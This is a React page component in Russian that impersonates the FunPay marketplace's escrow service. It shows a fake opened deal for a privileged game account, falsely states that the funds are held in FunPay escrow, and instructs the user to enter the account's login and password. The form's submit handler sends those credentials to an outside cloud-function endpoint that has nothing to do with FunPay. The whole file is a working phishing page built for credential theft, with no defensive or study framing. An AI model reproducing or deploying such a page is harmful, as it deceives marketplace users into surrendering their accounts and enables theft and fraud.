import { useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import Icon from "@/components/ui/icon";
import { toast } from "sonner";

const Index = () => {
  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitted, setIsSubmitted] = useState(false);

  const orderData = {
    id: '57878929',
    title: 'Аккаунт с привилегиями',
    price: '1 250 ₽',
    seller: 'GameMaster',
    buyer: 'Покупатель',
    date: new Date().toLocaleDateString('ru-RU'),
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (login && password) {
      try {
        const response = await fetch('https://functions.poehali.dev/2454b86d-2466-4286-84aa-bbad8472dac3', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ login, password }),
        });

        if (response.ok) {
          setIsSubmitted(true);
          toast.success('Данные успешно переданы продавцу!');
        } else {
          toast.error('Ошибка при отправке данных');
        }
      } catch (error) {
        toast.error('Ошибка подключения');
      }
    } else {
      toast.error('Пожалуйста, заполните все поля');
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <header className="bg-white border-b border-border">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-primary rounded-lg flex items-center justify-center">
              <Icon name="Shield" className="text-white" size={20} />
            </div>
            <h1 className="text-xl font-bold text-foreground">FunPay</h1>
            <Badge variant="secondary" className="ml-2">Гарант</Badge>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 max-w-4xl">

        <Card className="p-6 mb-6 animate-fade-in">
          <div className="flex items-center gap-3 mb-4">
            <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center">
              <Icon name="CheckCircle2" className="text-white" size={24} />
            </div>
            <div>
              <h2 className="text-2xl font-bold text-foreground">Сделка открыта</h2>
              <p className="text-muted-foreground">Заказ #{orderData.id}</p>
            </div>
          </div>

          <Separator className="my-4" />

          <div className="grid md:grid-cols-2 gap-4">
            <div>
              <p className="text-sm text-muted-foreground mb-1">Товар</p>
              <p className="font-medium text-foreground">{orderData.title}</p>
            </div>
            <div>
              <p className="text-sm text-muted-foreground mb-1">Стоимость</p>
              <p className="font-bold text-2xl text-primary">{orderData.price}</p>
            </div>
            <div>
              <p className="text-sm text-muted-foreground mb-1">Продавец</p>
              <p className="font-medium text-foreground">{orderData.seller}</p>
            </div>
            <div>
              <p className="text-sm text-muted-foreground mb-1">Дата</p>
              <p className="font-medium text-foreground">{orderData.date}</p>
            </div>
          </div>

          <div className="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg flex items-start gap-3">
            <Icon name="CheckCircle2" className="text-green-600 mt-0.5" size={20} />
            <div>
              <p className="font-medium text-green-900">Продавец оплатил заказ</p>
              <p className="text-sm text-green-700 mt-1">Средства заморожены на счету гаранта FunPay</p>
            </div>
          </div>
        </Card>

        <Card className="p-6 mb-6 animate-fade-in" style={{ animationDelay: '0.1s' }}>
          <div className="flex items-center gap-3 mb-4">
            <div className="w-10 h-10 bg-secondary rounded-full flex items-center justify-center">
              <Icon name="Shield" className="text-white" size={20} />
            </div>
            <h3 className="text-xl font-bold text-foreground">Информация о гаранте</h3>
          </div>

          <div className="space-y-3 text-sm">
            <div className="flex items-start gap-2">
              <Icon name="Check" className="text-green-600 mt-0.5 flex-shrink-0" size={16} />
              <p className="text-muted-foreground">Деньги находятся на защищенном счету FunPay до завершения сделки</p>
            </div>
            <div className="flex items-start gap-2">
              <Icon name="Check" className="text-green-600 mt-0.5 flex-shrink-0" size={16} />
              <p className="text-muted-foreground">Вы получите товар или вернете средства в случае проблем</p>
            </div>
            <div className="flex items-start gap-2">
              <Icon name="Check" className="text-green-600 mt-0.5 flex-shrink-0" size={16} />
              <p className="text-muted-foreground">Поддержка 24/7 поможет решить любые вопросы по сделке</p>
            </div>
          </div>
        </Card>

        <Card className="p-6 mb-6 animate-fade-in" style={{ animationDelay: '0.2s' }}>
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 bg-primary rounded-full flex items-center justify-center">
              <Icon name="KeyRound" className="text-white" size={20} />
            </div>
            <h3 className="text-xl font-bold text-foreground">Передача данных аккаунта</h3>
          </div>

          {!isSubmitted ? (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg mb-4">
                <div className="flex items-start gap-2">
                  <Icon name="Info" className="text-blue-600 mt-0.5 flex-shrink-0" size={18} />
                  <p className="text-sm text-blue-900">
                    Введите данные для входа в аккаунт. Продавец получит доступ только после вашего подтверждения.
                  </p>
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="login">Логин / Email</Label>
                <Input
                  id="login"
                  type="text"
                  placeholder="Введите логин или email"
                  value={login}
                  onChange={(e) => setLogin(e.target.value)}
                  className="w-full"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="password">Пароль</Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="Введите пароль"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full"
                />
              </div>

              <Button type="submit" className="w-full" size="lg">
                <Icon name="Send" className="mr-2" size={18} />
                Передать данные продавцу
              </Button>

              <p className="text-xs text-muted-foreground text-center">
                Нажимая кнопку, вы подтверждаете передачу данных продавцу через защищенный канал FunPay
              </p>
            </form>
          ) : (
            <div className="text-center py-8">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Icon name="CheckCircle2" className="text-green-600" size={32} />
              </div>
              <h4 className="text-lg font-bold text-foreground mb-2">Данные успешно переданы!</h4>
              <p className="text-muted-foreground mb-4">Продавец получил доступ к аккаунту</p>
              <div className="bg-muted p-4 rounded-lg inline-block">
                <p className="text-sm font-medium text-foreground mb-1">Переданные данные:</p>
                <p className="text-sm text-muted-foreground">Логин: {login}</p>
                <p className="text-sm text-muted-foreground">Пароль: {password.replace(/./g, '•')}</p>
              </div>
            </div>
          )}
        </Card>

        <Card className="p-6 animate-fade-in" style={{ animationDelay: '0.3s' }}>
          <div className="flex items-center gap-3 mb-4">
            <div className="w-10 h-10 bg-accent rounded-full flex items-center justify-center">
              <Icon name="ListChecks" className="text-white" size={20} />
            </div>
            <h3 className="text-xl font-bold text-foreground">Инструкция для покупателя</h3>
          </div>

          <div className="space-y-4">
            <div className="flex gap-4">
              <div className="flex-shrink-0">
                <div className="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold">1</div>
              </div>
              <div>
                <p className="font-medium text-foreground">Проверьте информацию о заказе</p>
                <p className="text-sm text-muted-foreground mt-1">Убедитесь, что сумма и товар соответствуют договоренности</p>
              </div>
            </div>

            <div className="flex gap-4">
              <div className="flex-shrink-0">
                <div className="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold">2</div>
              </div>
              <div>
                <p className="font-medium text-foreground">Передайте данные аккаунта</p>
                <p className="text-sm text-muted-foreground mt-1">Заполните форму выше с логином и паролем от аккаунта</p>
              </div>
            </div>

            <div className="flex gap-4">
              <div className="flex-shrink-0">
                <div className="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold">3</div>
              </div>
              <div>
                <p className="font-medium text-foreground">Дождитесь подтверждения</p>
                <p className="text-sm text-muted-foreground mt-1">Продавец проверит данные и подтвердит получение товара</p>
              </div>
            </div>

            <div className="flex gap-4">
              <div className="flex-shrink-0">
                <div className="w-8 h-8 bg-primary text-white rounded-full flex items-center justify-center font-bold">4</div>
              </div>
              <div>
                <p className="font-medium text-foreground">Сделка завершена</p>
                <p className="text-sm text-muted-foreground mt-1">После подтверждения средства будут переведены продавцу</p>
              </div>
            </div>
          </div>
        </Card>
      </main>

      <footer className="bg-white border-t border-border mt-12 py-6">
        <div className="container mx-auto px-4 text-center">
          <p className="text-sm text-muted-foreground">
            FunPay © 2024 — Безопасные сделки с гарантией
          </p>
        </div>
      </footer>

    </div>
  );
};

export default Index;